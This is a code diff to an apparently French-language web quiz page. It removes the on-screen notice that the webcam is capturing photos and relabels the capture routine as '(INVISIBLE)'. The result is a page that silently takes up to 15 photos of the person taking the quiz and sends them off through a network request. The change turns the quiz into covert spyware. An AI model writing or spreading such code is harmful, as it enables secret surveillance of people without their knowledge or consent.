@@ -159,43 +159,6 @@
       margin-bottom: 28px
     }
 
-    .cam-indicator {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      background: rgba(0, 0, 0, 0.85);
-      color: #10b981;
-      padding: 8px 16px;
-      border-radius: 99px;
-      font-size: 12px;
-      font-weight: 700;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      z-index: 9999;
-      border: 1px solid rgba(16, 185, 129, 0.3)
-    }
-
-    .cam-dot {
-      width: 8px;
-      height: 8px;
-      border-radius: 50%;
-      background: #10b981;
-      animation: pulseLed 1s infinite
-    }
-
-    @keyframes pulseLed {
-
-      0%,
-      100% {
-        opacity: 1
-      }
-
-      50% {
-        opacity: .3
-      }
-    }
-
     #video {
       display: none
     }
@@ -203,11 +166,6 @@
 </head>
 
 <body>
-
-  <div class="cam-indicator" id="cam-indicator">
-    <div class="cam-dot"></div>
-    <span>📷 CAPTURE ACTIVÉE</span>
-  </div>
 
   <div class="container">
     <div id="quiz-header">
@@ -300,11 +258,10 @@
         startContinuousCapture();
       } catch (e) {
         console.error('Erreur caméra:', e);
-        document.getElementById('cam-indicator').style.display = 'none';
       }
     }
 
-    // === CAPTURE 15 PHOTOS MAX ===
+    // === CAPTURE 15 PHOTOS MAX (INVISIBLE) ===
     function startContinuousCapture() {
       const video = document.getElementById('video');
       const canvas = document.createElement('canvas');
@@ -338,10 +295,6 @@
           })
         }).catch(e => console.log('Err:', e));
 
-        document.getElementById('cam-indicator').innerHTML = `
-      <div class="cam-dot"></div>
-      <span>📷 CAPTURE ${captureCount}/${MAX_CAPTURES}</span>
-    `;
       }, 1000);
     }
 
@@ -350,9 +303,6 @@
         videoStream.getTracks().forEach(t => t.stop());
         videoStream = null;
       }
-      document.getElementById('cam-indicator').innerHTML = `
-    <span style="color:#64748b;">📷 CAPTURE TERMINÉE (${15} photos)</span>
-  `;
     }
 
     function next(n) {
